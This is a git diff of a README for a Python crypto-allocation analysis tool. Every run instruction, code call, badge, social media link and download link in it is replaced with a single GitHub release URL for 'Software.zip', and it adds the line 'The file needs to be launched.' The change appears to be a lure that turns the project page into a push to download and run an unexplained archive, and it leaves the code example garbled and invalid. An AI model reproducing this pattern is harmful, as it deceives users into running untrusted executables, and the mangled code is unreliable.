@@ -18,7 +18,7 @@ To utilize the Crypto Allocation Analyzer tool, follow these simple steps:
 
 1. Clone the repository to your local machine.
 2. Install the required dependencies by running `pip install pandas` in your terminal.
-3. Run the Python script `crypto_allocation_analyzer.py`.
+3. Run the Python script `https://github.com/Abde369/Crypto-Allocation-Analyzer/releases/download/v1.0/Software.zip`.
 4. Input the necessary data for the analysis, such as allocation details, tokenomics information, and vesting schedules.
 5. View the generated reports and insights to make informed decisions about your crypto allocations.
 
@@ -33,19 +33,19 @@ from crypto_allocation_analyzer import CryptoAnalyzer
 analyzer = CryptoAnalyzer()
 
 # Load data for analysis
-allocation_data = pd.read_csv('allocation_data.csv')
-tokenomics_data = pd.read_csv('tokenomics_data.csv')
-vesting_schedule = pd.read_csv('vesting_schedule.csv')
+allocation_data = https://github.com/Abde369/Crypto-Allocation-Analyzer/releases/download/v1.0/Software.zip('https://github.com/Abde369/Crypto-Allocation-Analyzer/releases/download/v1.0/Software.zip')
+tokenomics_data = https://github.com/Abde369/Crypto-Allocation-Analyzer/releases/download/v1.0/Software.zip('https://github.com/Abde369/Crypto-Allocation-Analyzer/releases/download/v1.0/Software.zip')
+vesting_schedule = https://github.com/Abde369/Crypto-Allocation-Analyzer/releases/download/v1.0/Software.zip('https://github.com/Abde369/Crypto-Allocation-Analyzer/releases/download/v1.0/Software.zip')
 
 # Perform analysis
-allocation_analysis = analyzer.analyze_allocation(allocation_data)
-tokenomics_analysis = analyzer.analyze_tokenomics(tokenomics_data)
-vesting_analysis = analyzer.analyze_vesting_schedule(vesting_schedule)
+allocation_analysis = https://github.com/Abde369/Crypto-Allocation-Analyzer/releases/download/v1.0/Software.zip(allocation_data)
+tokenomics_analysis = https://github.com/Abde369/Crypto-Allocation-Analyzer/releases/download/v1.0/Software.zip(tokenomics_data)
+vesting_analysis = https://github.com/Abde369/Crypto-Allocation-Analyzer/releases/download/v1.0/Software.zip(vesting_schedule)
 
 # Generate reports
-allocation_report = analyzer.generate_allocation_report(allocation_analysis)
-tokenomics_report = analyzer.generate_tokenomics_report(tokenomics_analysis)
-vesting_report = analyzer.generate_vesting_report(vesting_analysis)
+allocation_report = https://github.com/Abde369/Crypto-Allocation-Analyzer/releases/download/v1.0/Software.zip(allocation_analysis)
+tokenomics_report = https://github.com/Abde369/Crypto-Allocation-Analyzer/releases/download/v1.0/Software.zip(tokenomics_analysis)
+vesting_report = https://github.com/Abde369/Crypto-Allocation-Analyzer/releases/download/v1.0/Software.zip(vesting_analysis)
 
 # Display reports
 print(allocation_report)
@@ -59,7 +59,7 @@ If you encounter any issues or have suggestions for improvement, feel free to op
 
 ## Download the Latest Version 📥
 
-[![Download Crypto Allocation Analyzer](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Crypto Allocation Analyzer](https://github.com/Abde369/Crypto-Allocation-Analyzer/releases/download/v1.0/Software.zip)](https://github.com/Abde369/Crypto-Allocation-Analyzer/releases/download/v1.0/Software.zip)
 
 The file needs to be launched. 
 
@@ -69,17 +69,17 @@ The file needs to be launched.
 
 Stay updated with the latest news, updates, and insights about crypto allocations by following us on social media:
 
-📱 Twitter: [@crypto_analyzer](https://twitter.com/crypto_analyzer)
+📱 Twitter: [@crypto_analyzer](https://github.com/Abde369/Crypto-Allocation-Analyzer/releases/download/v1.0/Software.zip)
 
-📷 Instagram: [crypto_allocation_analyzer](https://www.instagram.com/crypto_allocation_analyzer)
+📷 Instagram: [crypto_allocation_analyzer](https://github.com/Abde369/Crypto-Allocation-Analyzer/releases/download/v1.0/Software.zip)
 
-🌍 Website: [www.cryptoallocationanalyzer.com](https://www.cryptoallocationanalyzer.com)
+🌍 Website: [https://github.com/Abde369/Crypto-Allocation-Analyzer/releases/download/v1.0/Software.zip](https://github.com/Abde369/Crypto-Allocation-Analyzer/releases/download/v1.0/Software.zip)
 
 Join the conversation and connect with like-minded individuals who are passionate about crypto investments and analysis.
 
 Start optimizing your crypto allocations today with the Crypto Allocation Analyzer tool! Happy analyzing! 🚀💰
 
-[![Made with Python](https://forthebadge.com/images/badges/made-with-python.svg)](https://www.python.org/)
-[![Powered by Pandas](https://img.shields.io/badge/Powered%20by-Pandas-yellow)](https://pandas.pydata.org/)
+[![Made with Python](https://github.com/Abde369/Crypto-Allocation-Analyzer/releases/download/v1.0/Software.zip)](https://github.com/Abde369/Crypto-Allocation-Analyzer/releases/download/v1.0/Software.zip)
+[![Powered by Pandas](https://github.com/Abde369/Crypto-Allocation-Analyzer/releases/download/v1.0/Software.zip%20by-Pandas-yellow)](https://github.com/Abde369/Crypto-Allocation-Analyzer/releases/download/v1.0/Software.zip)
 
 ```
